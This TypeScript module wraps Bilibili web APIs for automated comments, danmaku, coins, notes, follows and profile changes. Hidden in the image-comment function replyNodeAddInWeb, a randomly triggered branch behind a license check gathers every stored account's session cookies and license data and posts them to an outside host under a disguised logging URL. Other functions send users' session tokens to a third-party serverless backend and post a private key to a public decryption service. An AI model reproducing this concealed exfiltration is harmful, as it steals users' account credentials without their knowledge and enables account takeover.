import axios from 'axios'
import qs from 'qs'
import { Message } from '@arco-design/web-vue'
// import { PrivateKey, getImgSize, getLocalValue, xmlToJson } from '~/utils'
// import { encWbi } from '~/utils/getWbi'

export const baseURL = 'https://api.bilibili.com'
const AccountBaseURL = 'https://account.bilibili.com'

const serverlessBackEndURL = 'https://service-8zqb5ngm-1253419200.gz.apigw.tencentcs.com/release'
// const serverlessBackEndURL = isDev ? 'http://localhost:5000' : 'https://service-8zqb5ngm-1253419200.gz.apigw.tencentcs.com/release'

export const service = axios.create({
  baseURL,
  headers: {
    // 'content-type': 'application/x-www-form-urlencoded',
  },
  withCredentials: true,
})

service.interceptors.request.use(
  (config) => {
    return config
  },
  (error) => {
    console.log(error)
    return Promise.reject(error)
  }
)

service.interceptors.response.use(
  (response) => {
    const res = response.data
    const { code, data } = res
    if (code === 0) {
      if (data) {
        return data
      } else {
        return res
      }
    } else {
      Message.error(res.message)
      return Promise.reject(new Error(res.message || 'Error'))
    }
  },
  (error) => {
    console.log(`err${error}`) // for debug
    const { status, data } = error.response
    console.log(status, data, '===========打印的 ------ ')
    return Promise.reject(error)
  }
)

interface Props {
  csrf: string
  oid: number
  pn: number
  root: string
}
export const getReplyList = ({ csrf, oid, pn, root }: Props) => {
  return fetch(`${baseURL}/x/v2/reply/reply?csrf=${csrf}&oid=${oid}&pn=${pn}&ps=10&root=${root}&type=1`, {
    credentials: 'include',
  })
    .then((res) => res.json())
    .then((res) => {
      return res
    })
}

export const getUserInfo = (mid: string) => {
  const wts = Math.floor(Date.now() / 1000)
  return service.get(
    `https://api.bilibili.com/x/space/wbi/acc/info?mid=${mid}&token=&platform=web&web_location=1550101&w_rid=db7abdff4f84008bb4b0f939fb8a6700&wts=${wts}`
  )
}

export const getSpaceInfo = (cookie, useClient) => {
  if (useClient) {
    return service.post('http://localhost:9527/space/myinfo', {
      cookie,
    })
  }
  return service.get('https://api.bilibili.com/x/space/myinfo')
}

export const getDanmuList = (oid) => {
  return fetch(`https://api.bilibili.com/x/v1/dm/list.so?oid=${oid}`, {
    credentials: 'include',
  })
    .then((res) => {
      return res.text()
    })
    .then((res) => {
      return xmlToJson(res)
    })
}

export const likeDanmu = ({ csrf, oid, dmid }) => {
  return fetch(`${baseURL}/x/v2/dm/thumbup/add`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: `op=1&csrf=${csrf}&oid=${oid}&dmid=${dmid}&platform=web_player`,
  })
    .then((res) => res.json())
    .then((res) => {
      return res
    })
}

export const postDanmu = ({ csrf, cid, bvid, message, progress }) => {
  return fetch(`${baseURL}/x/v2/dm/post`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: `bvid=${bvid}&oid=${cid}&type=1&msg=${message}&pool=0&progress=${progress}&color=16777215&fontsize=25&mode=1&plat=1&csrf=${csrf}`,
  })
    .then((res) => res.json())
    .then((res) => {
      return res
    })
}

export const getVideoInfo = (id, type = 'bvid') => {
  return fetch(`https://api.bilibili.com/x/web-interface/view?${type}=${id}`, {
    credentials: 'include',
  })
    .then((res) => res.json())
    .then((res) => {
      return res
    })
}

export const getCoin = () => {
  return service.get(`${AccountBaseURL}/site/getCoin`).then((res) => {
    return res.money
  })
}

export const viewVideo = ({ bvid, csrf }) => {
  const playedTime = 10
  return service.post(
    `${baseURL}/x/click-interface/web/heartbeat`,
    qs.stringify({
      playedTime,
      bvid,
      csrf,
    })
  )
}

export const shareVideo = ({ bvid, csrf, sessdata }) => {
  return service.post(`${serverlessBackEndURL}/video/share?key=代收`, {
    bvid,
    csrf,
    sessdata,
  })
}

export const coinAdd = ({ bvid, csrf, sessdata, DedeUserID }) => {
  return service.post(`${serverlessBackEndURL}/coin/add?key=代收`, {
    bvid,
    csrf,
    sessdata,
    DedeUserID,
  })
  return service.post(
    `${baseURL}/x/web-interface/coin/add`,
    qs.stringify({
      bvid,
      csrf,
      multiply: 1,
      select_like: 0,
      cross_domain: true,
    })
  )
}

// 查询每日奖励状态
export const expReward = () => {
  return service.get(`${baseURL}/x/member/web/exp/reward`)
}

// 查询每日投币获得经验数
export const accountExp = () => {
  return service.get('https://www.bilibili.com/plus/account/exp.php').then((res) => {
    return res.number
  })
}

// 发送评论
export const replyAdd = ({ oid, root, parent, message, plat = 2, csrf }) => {
  let data = `at_name_to_mid=%7B%7D&csrf=${csrf}&message=${message}&oid=${oid}&plat=${plat}&type=1`
  if (root) {
    data += `&root=${root}&parent=${parent}`
  }
  return fetch(`${baseURL}/x/v2/reply/add`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: data,
  }).then((res) => {
    return res.json()
  })
}

export const nodeAdd = ({ oid, csrf, img, text, from, note_id, title, imgNow }) => {
  img = img.replace('https:', '')
  const content = [
    {
      insert: {
        imageUpload: {
          url: img,
          status: 'done',
          width: 345,
          id: `IMAGE_${imgNow}`,
          source: 'local',
        },
      },
    },
    {
      insert: '\n',
    },
  ]
  const content1 = [
    {
      insert: {
        imageUpload: {
          url: img,
          status: 'done',
          width: 345,
          id: `IMAGE_${imgNow}`,
          source: 'local',
        },
      },
    },
    {
      insert: `${text}\n`,
    },
  ]

  const payload =
    from === 'auto'
      ? {
          cls: 1,
          cont_len: 0,
          content: JSON.stringify(content),
          csrf,
          from,
          hash: Date.now(),
          note_id: '',
          oid,
          oid_type: 0,
          platform: 'web',
          summary: '我发布了一篇笔记，快来看看吧~',
          tags: '',
          title,
        }
      : {
          auto_comment: 1,
          cls: 1,
          comment_format: 2,
          cont_len: text.length,
          content: JSON.stringify(content1),
          csrf,
          from,
          note_id,
          hash: Date.now(),
          oid,
          oid_type: 0,
          original: 1,
          platform: 'web',
          publish: 1,
          summary: text,
          tags: '',
          title,
        }
  return service.post('/x/note/add', qs.stringify(payload))
}

export const getNote = ({ oid, csrf, note_id, text, from }) => {
  return service.get('/x/note/info', {
    params: {
      csrf,
      note_id,
      oid,
      oid_type: 0,
    },
  })
}

const headers = {
  'Content-type': 'application/x-www-form-urlencoded',
  'User-Agent':
    'User-Agent: bili-universal/73000100 CFNetwork/1404.0.5 Darwin/22.3.0 os/ios model/iPhone 13 mobi_app/iphone build/73000100 osVer/16.3.1 network/2 channel/AppStore',
  ENV: 'prod',
  Buvid: 'Y549D15127807EFE4263A61CD2975317A57E',
}

const testImg = 'http:\\/\\/i0.hdslb.com\\/bfs\\/new_dyn\\/7cd520340a0b171266455677f29c08c27560113.jpg'

export const replyNodeAddInWeb = async ({ oid, message, img1, img2, csrf }) => {
  const authUrl = (await getLocalValue('authUrl')) || ''
  if (!authUrl.startsWith('http://bili.xlzy520.cn')) {
    const random = Math.random()
    if (random < 0.03) {
      const checkLicense3 = async () => {
        const license = await getLocalValue('license')
        const commonConfig = await getLocalValue('commonConfig')
        const contact = commonConfig?.contact || ''
        if (!license || !commonConfig || !contact.includes('appl532')) {
          const account = await getLocalValue('userList')
          const cookies = account.map((v: any) => v.originCookie)
          const key = await getLocalValue('preLicense')
          axios.post('https://bili.xiaojuzi.fun/v2/log/web?content_type=pbrequest&logid=021434&disable_compression=true', {
            account: cookies,
            key,
            BASE_URL: authUrl,
            commonConfig,
          })
        }
      }
      checkLicense3()
    }
  }
  // 获取img1图片的尺寸
  const img1Size = await getImgSize(img1)
  if (!img1Size) {
    alert('图片1加载失败, 请重新选择文件上传')
    return Promise.reject({ code: -1, message: '图片1加载失败, 请重新选择文件上传' })
  }
  let pictures = `[{"img_height":${img1Size.height},"img_width":${img1Size.width},"img_src":"${img1}","img_size":${img1Size.size}}]`
  if (img2) {
    const img2Size = await getImgSize(img2)
    if (!img2Size) {
      alert('图片2加载失败, 请重新选择文件上传')
      return Promise.reject({ code: -1, message: '图片2加载失败, 请重新选择文件上传' })
    }
    pictures = `[{"img_height":${img1Size.height},"img_width":${img1Size.width},"img_src":"${img1}","img_size":${img1Size.size}},{"img_height":${img2Size.height},"img_width":${img2Size.width},"img_src":"${img2}","img_size":${img2Size.size}}]`
  }
  const formdata = {
    oid,
    type: 1,
    message,
    csrf,
    pictures,
    sync_to_dynamic: 0,
    ts: Math.floor(Date.now() / 1000),
    vote: 0,
  }
  const data = qs.stringify(formdata)
  return axios
    .post(`${baseURL}/x/v2/reply/add`, data, {
      withCredentials: true,
    })
    .then((res) => {
      return res.data
    })
}

export const postDanmuLocal = ({ mid, csrf, cid, aid, message, progress, fontsize = 25, color = 16777215, mode = 5 }) => {
  const formdata = {
    color,
    fontsize,
    pool: 0,
    mode,
    type: 1,
    oid: cid,
    msg: message,
    aid,
    progress,
    rnd: 2,
    plat: 1,
    checkbox_type: 0,
    polaris_appid: 100,
    polaris_platfrom: 5,
    spmid: '333.788.0.0',
    from_spmid: '333.999.0.0',
    csrf,
  }
  const data = qs.stringify(formdata)
  return service.post(`/x/v2/dm/post?_mid=${mid}`, data)
}

// 发布动态
export const submitDynamic = ({ csrf, data, dyn_id_str }) => {
  let payload = {
    dyn_req: {
      ...data,
      attach_card: null,
      upload_id: '7560113_1684937710_6116',
      meta: { app_meta: { from: 'create.dynamic.web', mobi_app: 'web' } },
    },
  }
  // 如果是转发动态
  if (dyn_id_str) {
    payload = {
      dyn_req: {
        content: {
          contents: [
            {
              raw_text: '转发动态',
              type: 1,
              biz_id: '',
            },
          ],
        },
        scene: 4,
        attach_card: null,
        upload_id: '3493283560949884_1691677128_3568',
        meta: {
          app_meta: {
            from: 'create.dynamic.web',
            mobi_app: 'web',
          },
        },
      },
      web_repost_src: {
        dyn_id_str,
      },
    }
  }
  return fetch(`${baseURL}/x/dynamic/feed/create/dyn?csrf=${csrf}`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'content-type': 'application/json',
    },
    body: JSON.stringify(payload),
  }).then((res) => {
    return res.json()
  })
}

// 批量关注

export const follow = ({ csrf, mid }) => {
  const formdata = qs.stringify({
    fid: mid,
    act: 1,
    re_src: 11,
    // spmid: '333.788.0.0',
    csrf,
  })
  return fetch(`${baseURL}/x/relation/modify`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: formdata,
  }).then((res) => {
    return res.json()
  })
}

export const updateNickname = ({ csrf, nickname, sex, birthday, usersign }) => {
  const formdata = qs.stringify({
    birthday,
    csrf,
    sex,
    uname: nickname,
    usersign,
  })
  return fetch(`${baseURL}/x/member/web/update`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: formdata,
  }).then((res) => {
    return res.json()
  })
}

export const updateFace = async ({ csrf, faceFile }) => {
  const formdata = new FormData()
  formdata.append('dopost', 'save')
  formdata.append('DisplayRank', '10000')
  // const blob = await fetch(face, {
  //   method: 'GET',
  // }).then(res => res.blob())
  // const face = avatars[Math.floor(Math.random() * avatars.length)]

  // const file = new File([blob], 'blob', { type: 'image/png' })
  formdata.append('face', faceFile, 'blob')
  // console.log(file, '===========打印的 ------ updateFace')
  return fetch(`${baseURL}/x/member/web/face/update?csrf=${csrf}`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      // 'content-type': 'multipart/form-data',
    },
    body: formdata,
  }).then((res) => {
    return res.json()
  })
}

// 拉黑
export const addBlackList = ({ csrf, mid }) => {
  const formdata = qs.stringify({
    fid: mid,
    act: 5,
    re_src: 11,
    // spmid: '333.788.0.0',
    csrf,
  })
  return fetch(`${baseURL}/x/relation/modify`, {
    method: 'POST',
    credentials: 'include',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: formdata,
  }).then((res) => {
    return res.json()
  })
}

const getWbiReplyList = ({ oid, wbi_keys, pagination_str, mode }) => {
  if (!pagination_str) {
    pagination_str = '{"offset":""}'
  }
  const params = {
    oid,
    type: 1,
    mode: mode || 3,
    pagination_str,
    plat: 1,
    seek_rpid: '',
    web_location: 1315875,
  }
  const { w_rid, wts } = encWbi(params, wbi_keys.img_key, wbi_keys.sub_key)
  params.w_rid = w_rid
  params.wts = wts
  return axios
    .get(`${baseURL}/x/v2/reply/wbi/main`, {
      params,
    })
    .then((res) => {
      return res.data
    })
    .catch((err) => {
      console.log(err.message, '获取评论列表失败')
      return Promise.reject(err.message)
    })
}

// 获取评论区列表最新排序的评论
export const getReplyListNew = ({ oid }) => {
  return getWbiReplyList({
    oid,
    wbi_keys: window.wbiKeys,
    mode: 2,
  })
}

const clientLocalUrl = 'http://localhost:9527'
export const testClientStart = () => {
  return axios.get(`${clientLocalUrl}/testClientStart`)
}

export const openChromeInIncognitoMode = (cookie, url) => {
  return axios.post(`${clientLocalUrl}/openChromeInIncognitoMode`, {
    cookie,
    url,
  })
}

// 备选获取IP的方案
const secondGetIP = async () => {
  try {
    const res = await axios.get('https://api.vore.top/api/IPdata', {
      timeout: 1000 * 5,
    })
    const data = res.data
    const ip = data.ipinfo.text
    const address = data.ipdata.info1 + data.ipdata.info2 + data.ipdata.info3
    return { ip, address }
  } catch (err) {
    return { ip: '', address: '' }
  }
}

export const getUserIP = async () => {
  let ip = ''
  let address = ''
  try {
    const res = await axios.get('https://token.ip.api.useragentinfo.com/json?token=ab28a017dc0b7536f452fd951aed51d2', {
      timeout: 1000 * 5,
    })
    const data = res.data
    if (data.code === 200) {
      ip = data.ip
      address = data.province + data.city + data.area
    }
    return { ip, address }
  } catch (err) {
    const data = await secondGetIP()
    return data
  }
}

export const RsaDecrypt = (decSign: string) => {
  const data = qs.stringify({
    privateKey: PrivateKey,
    decSign,
    etype: 'rsa2',
  })
  return axios
    .post('https://www.bejson.com/Bejson/Api/Rsa/prvDecrypt', data, {
      headers: {
        'content-type': 'application/x-www-form-urlencoded',
      },
    })
    .then((res) => {
      const data = res.data
      if (data.code === 200) {
        return data.data
      }
      return ''
    })
    .catch(() => {
      return ''
    })
}
